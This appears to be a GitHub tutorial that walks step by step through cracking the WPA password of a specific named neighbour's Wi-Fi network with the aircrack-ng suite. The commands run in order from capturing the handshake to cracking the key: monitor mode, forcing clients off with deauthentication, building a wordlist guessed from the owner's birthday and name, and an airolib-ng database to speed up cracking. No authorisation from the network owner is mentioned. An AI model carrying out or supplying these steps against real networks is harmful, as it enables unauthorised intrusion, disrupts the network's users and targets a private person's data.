## Example crack wpa attack speed with airolib-ng, aircrack-ng

i use tp-link wn725n and on parrotOS, the name of it is ridiculous

```
iwconfig
```

![image](https://user-images.githubusercontent.com/90561566/166419875-330952f9-ce4a-416d-b403-ec2d39ecc3dc.png)

```
airmon-ng start <iface>
```

![image](https://user-images.githubusercontent.com/90561566/166419967-2d8d1bd2-eb49-40b7-b46f-cf52497eba4b.png)

```
airodump-ng <iface>
```

![image](https://user-images.githubusercontent.com/90561566/166420371-20c0ce94-e653-4cda-b87b-72f071d94a49.png)

i will choose target is `Quang Minh 2G`, CH `11`, bssid `5C:1A:6F:88:19:19`

```
airodump-ng -c <CH> --bssid <bssid> -w out <iface>
```

![image](https://user-images.githubusercontent.com/90561566/166420867-1c3d3d5a-5c26-4f67-b271-84f9a19c81d0.png)

new terminal

```
aireplay-ng --deauth 0 -a <bssid> <iface>
```

wait about 5s, return airodump-ng terminal, if you see WPA handshake is okay and Ctrl+C to stop (both)

![image](https://user-images.githubusercontent.com/90561566/166421288-8ba74de3-f6f9-4973-be3e-d9aafd8fcb11.png)

```
ls
```

![image](https://user-images.githubusercontent.com/90561566/166421374-cfcf7080-c28a-402b-a6cb-9fda3a275a91.png)

create passlist

```
crunch <min> <max> <charset> -t <pattern> -o password.txt
```

because it's going to be a very, very large file, so i'm going to reveal that

the password is 8 numbers (i think it contains in his birthday) and 1 character (i think it contains in his name)

you can also use [Cupp](https://github.com/lucthienphong1120/cupp) to make such inferences

![image](https://user-images.githubusercontent.com/90561566/166432950-8e1e639f-a889-47e9-83eb-be9c8282a237.png)

the output file about 7,6 GB and 8 hundred thousand passwords

---

now you can crack wpa with

```
aircrack-ng -w password.txt out*.cap
```

![image](https://user-images.githubusercontent.com/90561566/166422150-4ae8f0bd-47a0-4d57-9ddf-5f7905228535.png)

---

but i will use database to speed up the attack

it will take more time to set up the database (but it will be much faster than regular crack)

install sqlite3 `sudo apt install sqlite3`

create a file `essid.txt` this write name of target wifi

![image](https://user-images.githubusercontent.com/90561566/166434891-81c08ca3-48ff-4579-9a74-fe6e65634b42.png)

```
airolib-ng crackwpa --import passwd password.txt
airolib-ng crackwpa --import essid essid.txt
airolib-ng crackwpa --stats
airolib-ng crackwpa --clean all
airolib-ng crackwpa --batch
```

![image](https://user-images.githubusercontent.com/90561566/166435872-44a73959-3784-41c3-849a-5c1aa823dcd4.png)



















